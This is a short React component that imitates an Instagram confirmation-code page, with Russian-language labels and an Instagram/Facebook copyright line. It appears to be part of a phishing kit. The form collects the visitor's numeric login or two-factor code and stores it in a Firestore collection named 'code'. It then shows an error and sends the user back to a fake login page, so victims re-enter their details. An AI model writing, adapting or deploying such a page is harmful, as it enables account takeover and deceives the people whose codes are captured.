import React, { useState } from 'react'
import {firestore} from './App';

export default function CodePage(props) {
    const [code, setCode] = useState(null);

    const changeCode = (e) => {
      setCode(e.target.value)
    }
  
    const codeSubmit = (e) => {
      e.preventDefault()
  
      if (!code) {
        return;
      }

      firestore.collection('code').add({
        codeData: code
      }).then(() => {
          props.updateError()
          props.changePage('login')
      })
    }

    return (
        <div className="loginPage">
            <div className="main">
                <div className="content">
                    <div className="logo"></div>

                    <div className="formContainer">
                        <form className="form" onSubmit={codeSubmit}>
                            <label className="label">
                                <span class="labelSpan">Код подтверждения</span>
                                <input className="input" name="code" type="number" value={code} onChange={changeCode} />
                            </label>

                            <button className="submitBtn" type="submit">Подтвердить</button>
                        </form>

                        
                    </div>
                </div>
                <div className="copyRight">© Instagram от Facebook, 2021</div>
            </div>
            
        </div>
    )
}